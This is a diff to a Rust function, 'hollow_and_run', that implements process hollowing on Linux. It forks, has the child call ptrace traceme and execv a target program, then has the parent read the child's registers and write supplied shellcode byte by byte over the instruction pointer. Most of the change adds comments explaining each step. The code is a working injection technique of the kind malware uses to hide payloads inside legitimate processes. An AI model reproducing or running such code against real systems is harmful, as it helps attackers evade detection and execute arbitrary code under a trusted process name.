@@ -8,17 +8,21 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
    match unsafe { fork() } {
       // This is the original process and has the same PID as it
       Ok(ForkResult::Parent { child, .. }) => {
+         // Wait for the child to be ready for ptrace manipulation
          if let Err(error) = waitpid(child, None) {
             panic!("Could not wait for {target_process} to change state: {error}");
          };
          
+         // Dump the registers for the child process
          let registers = match getregs(child) {
             Err(error) => panic!("Could not get registers for {target_process}: {error}"),
             Ok(value) => value
          };
 
+         // Copy RIP to a mutable variable
          let mut point = registers.rip;
 
+         // Write the shellcode over where RIP used to point, one byte at a time
          for byte in shellcode {
             if let Err(error) = unsafe { write(child, point as *mut c_void, *byte as *mut c_void) } {
                 panic!("Unable to write portion of shellcode at {byte} to {target_process}: {error}");
@@ -34,13 +38,14 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
       },
       // This is the forked child and has a different PID
       Ok(ForkResult::Child) => {
-         let executable = CString::new(target_process).unwrap();
-         let arguments: &[&CStr; 0] = &[];
-
+         // Indicate to the parent process that the child is traceable
          if let Err(error) = traceme() {
             panic!("Could not set child as traceable: {error}");
          }
 
+         // Execute the target process in place of the currently running one (ie, the child)
+         let executable = CString::new(target_process).unwrap();
+         let arguments: &[&CStr; 0] = &[];
          if let Err(error) = execv(&executable, arguments) {
             panic!("Could not execv: {error}");
          }
